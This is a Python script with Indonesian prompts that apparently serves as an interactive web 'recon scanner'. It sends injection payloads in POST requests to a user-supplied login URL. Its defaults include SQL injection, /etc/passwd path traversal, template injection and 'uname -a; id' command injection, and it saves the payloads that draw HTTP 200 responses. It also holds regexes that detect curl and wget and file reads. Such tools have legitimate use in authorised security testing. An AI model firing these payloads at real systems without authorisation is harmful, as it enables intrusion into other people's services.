#!/usr/bin/env python3
"""
Interactive Recon Scanner with verbose output and progress bar
- Prompts user for email, target URL, payload file
- Optionally runs active scanning (POST requests)
- Saves JSON results and payloads with HTTP 200
"""

from __future__ import annotations
import json
import logging
import math
import queue
import re
import sys
import threading
import time
from dataclasses import dataclass, asdict
from typing import List, Optional, Pattern, Sequence, Tuple

try:
    import requests
except ImportError:
    requests = None

try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init(autoreset=True)
except ImportError:
    class _NoColor:
        def __getattr__(self, name):
            return ""
    Fore = Style = _NoColor()

try:
    from tqdm import tqdm
except ImportError:
    tqdm = None

# logging
LOG_FILE = "debug_scan.log"
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# practical email regex
RFC822_REGEX: Pattern = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")

# detection regexes
RCE_REGEX: Pattern = re.compile(r"(?:\b(cat|ls|id|uname|whoami|wget|curl)\b|;|\|\||`.+?`)", re.IGNORECASE)
LFI_REGEX: Pattern = re.compile(r"(?:\.\./|\.\\\.\\|/etc/passwd|boot\.ini|win\.ini)", re.IGNORECASE)
SSTI_REGEX: Pattern = re.compile(r"(\{\{.*?\}\}|\{\%.*?\%\})", re.IGNORECASE)

@dataclass
class DetectionResult:
    payload: str
    detections: List[str]
    payload_score: float
    response_score: Optional[float] = None
    response_detections: Optional[List[str]] = None
    status_code: Optional[int] = None

# ---------------- utilities ----------------

def is_rfc822_valid(email: str) -> bool:
    return bool(email and RFC822_REGEX.match(email))

def detect_matches(text: Optional[str], regexes: Sequence[Tuple[str, Pattern]]) -> List[str]:
    if not text:
        return []
    found: List[str] = []
    for name, pattern in regexes:
        try:
            if pattern.search(text):
                found.append(name)
        except re.error as e:
            logger.warning("Invalid regex %s: %s", name, e)
    return found

def ai_risk_score_local(text: str) -> float:
    if not text:
        return 0.0
    specials = len(re.findall(r"[;|&{}$`<>]", text))
    length = len(text)
    length_factor = min(length / 200.0, 1.0)
    freq = {}
    for ch in text:
        freq[ch] = freq.get(ch, 0) + 1
    entropy = 0.0
    for count in freq.values():
        p = count / length
        entropy -= p * math.log2(p)
    max_entropy = math.log2(len(freq)) if len(freq) > 1 else 1.0
    entropy_norm = entropy / max_entropy if max_entropy > 0 else 0.0
    raw = (specials * 0.6) + (length_factor * 2.5) + (entropy_norm * 3.0)
    score = max(0.0, min((raw / 5.0) * 10.0, 10.0))
    return round(score, 2)

def load_payloads_from_file(filename: str) -> List[str]:
    out: List[str] = []
    try:
        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                s = ln.strip()
                if not s or s.startswith("#"):
                    continue
                out.append(s)
    except Exception as e:
        logger.error("Failed to load payload file %s: %s", filename, e)
    return out

def default_send_request(session: "requests.Session", url: str, data: dict, headers: dict = None, timeout: float = 10.0, retries: int = 2, backoff: float = 0.5):
    assert requests is not None, "requests module not available"
    headers = headers or {"User-Agent": "recon-scanner/1.0"}
    last_exc = None
    for attempt in range(retries + 1):
        try:
            r = session.post(url, data=data, headers=headers, timeout=timeout)
            return r.status_code, r.text
        except Exception as e:
            last_exc = e
            logger.warning("Request attempt %d failed for %s: %s", attempt + 1, url, e)
            time.sleep(backoff * (attempt + 1))
    raise last_exc

# ---------------- analyzer ----------------

def analyze_payloads(
    payloads: Sequence[str],
    base_email: str,
    active: bool,
    target_url: Optional[str],
    n8n_webhook: Optional[str],
    concurrency: int = 4,
    rate_limit: float = 0.5,
    verbose: bool = True
) -> List[DetectionResult]:
    active_regexes: List[Tuple[str, Pattern]] = [("RCE", RCE_REGEX), ("LFI", LFI_REGEX), ("SSTI", SSTI_REGEX)]
    results: List[DetectionResult] = []

    q: "queue.Queue[str]" = queue.Queue()
    for p in payloads:
        q.put(p)

    session = requests.Session() if requests else None
    lock = threading.Lock()

    pbar = tqdm(total=len(payloads), desc="Scanning payloads", unit="payload") if tqdm else None

    def worker():
        while True:
            try:
                payload = q.get_nowait()
            except Exception:
                return

            if verbose:
                print(Fore.YELLOW + f"[+] Processing payload: {payload}" + Style.RESET_ALL)

            payload_detections = detect_matches(payload, active_regexes)
            payload_score = ai_risk_score_local(payload)

            resp_score = None
            resp_detections = None
            status_code = None

            # generate email variants
            local_variants = []
            try:
                local_part, domain = base_email.split("@", 1)
                local_variants = [f"{payload}@{domain}", f"{payload}+{local_part}@{domain}", f"{local_part}+{payload}@{domain}"]
            except Exception:
                local_variants = [f"{payload}@example.invalid"]

            for ve in local_variants:
                if is_rfc822_valid(ve):
                    try:
                        with open("valid_emails.txt", "a", encoding="utf-8") as f:
                            f.write(ve + "\n")
                        if verbose:
                            print(Fore.GREEN + f"    Saved email variant: {ve}" + Style.RESET_ALL)
                    except Exception as e:
                        logger.warning("Failed saving email %s: %s", ve, e)

            if active and session and target_url:
                try:
                    status_code, body = default_send_request(session, target_url, data={"username": payload, "password": "test"})
                    body_trim = body[:8000]
                    resp_detections = detect_matches(body_trim, active_regexes)
                    resp_score = ai_risk_score_local(body_trim)
                    if verbose:
                        print(Fore.CYAN + f"    Response code: {status_code}, detections: {resp_detections}" + Style.RESET_ALL)
                except Exception as e:
                    logger.error("Active request failed for payload %s: %s", payload, e)
                    if verbose:
                        print(Fore.RED + f"    Request failed: {e}" + Style.RESET_ALL)

            res = DetectionResult(payload=payload, detections=payload_detections, payload_score=payload_score,
                                  response_score=resp_score, response_detections=resp_detections, status_code=status_code)
            with lock:
                results.append(res)
                if pbar:
                    pbar.update(1)

            # optionally push to n8n
            if n8n_webhook and requests:
                try:
                    requests.post(n8n_webhook, json={
                        "payload": payload,
                        "detections": res.detections,
                        "payload_score": res.payload_score,
                        "response_score": res.response_score,
                        "response_detections": res.response_detections,
                        "status_code": res.status_code,
                    }, timeout=5)
                    if verbose:
                        print(Fore.MAGENTA + "    Pushed payload to n8n webhook" + Style.RESET_ALL)
                except Exception as e:
                    logger.warning("Failed n8n POST: %s", e)
                    if verbose:
                        print(Fore.RED + f"    Failed n8n POST: {e}" + Style.RESET_ALL)

            time.sleep(rate_limit)
            q.task_done()

    threads: List[threading.Thread] = []
    for _ in range(max(1, concurrency)):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    q.join()
    if pbar:
        pbar.close()
    if verbose:
        print(Fore.BLUE + "[*] All payloads processed" + Style.RESET_ALL)

    return results

# ---------------- output helpers ----------------

def save_results_json(results: List[DetectionResult], filename: str) -> None:
    try:
        with open(filename, "w", encoding="utf-8") as f:
            json.dump([asdict(r) for r in results], f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error("Failed to save JSON results to %s: %s", filename, e)

def save_valid_200(results: List[DetectionResult], filename: str) -> None:
    try:
        with open(filename, "w", encoding="utf-8") as f:
            for r in results:
                if r.status_code == 200:
                    f.write(f"{r.payload}\t{r.status_code}\n")
    except Exception as e:
        logger.error("Failed to save valid-200 file %s: %s", filename, e)

# ---------------- interactive flow ----------------

def interactive_main() -> None:
    print("=== Recon Scanner (interactive) ===")
    email = input("Masukkan nama email (contoh: you@example.com): ").strip()
    while not email or not is_rfc822_valid(email):
        print("Email tidak valid. Coba lagi.")
        email = input("Masukkan nama email: ").strip()

    url = input("Masukkan alamat URL target (contoh: https://example.com/login): ").strip()
    while not url:
        print("URL tidak boleh kosong")
        url = input("Masukkan alamat URL target: ").strip()

    use_file = input("Gunakan file payload? (y/N): ").strip().lower() == 'y'
    if use_file:
        pf = input("Path file payload (txt, satu payload per baris): ").strip()
        payloads = load_payloads_from_file(pf)
        if not payloads:
            print("Gagal memuat payload dari file atau file kosong. Menggunakan payload default.")
            payloads = ["admin' OR 1=1 --", "../../etc/passwd", "{{7*7}}", "uname -a; id"]
    else:
        payloads = ["admin' OR 1=1 --", "../../etc/passwd", "{{7*7}}", "uname -a; id"]

    do_active = input("Jalankan active scanning? (y/N): ").strip().lower() == 'y'
    if do_active and not requests:
        print("Module 'requests' tidak tersedia. Jalankan tanpa active mode.")
        do_active = False

    n8n = input("Masukkan n8n webhook URL (atau enter jika tidak): ").strip() or None

    concurrency = input("Jumlah worker (default 4): ").strip()
    try:
        concurrency = int(concurrency) if concurrency else 4
    except ValueError:
        concurrency = 4

    rate = input("Delay per request per worker (detik, default 0.5): ").strip()
    try:
        rate = float(rate) if rate else 0.5
    except ValueError:
        rate = 0.5

    print("\nMulai scanning...\n")
    results = analyze_payloads(payloads=payloads, base_email=email, active=do_active,
                               target_url=url if do_active else None,
                               n8n_webhook=n8n,
                               concurrency=concurrency,
                               rate_limit=rate,
                               verbose=True)

    out_json = "analysis_results.json"
    save_results_json(results, out_json)
    out_200 = "valid_200.txt"
    save_valid_200(results, out_200)

    print(f"\nSelesai. Hasil JSON disimpan di: {out_json}")
    print(f"Payload dengan response 200 disimpan di: {out_200}")


if __name__ == "__main__":
    interactive_main()
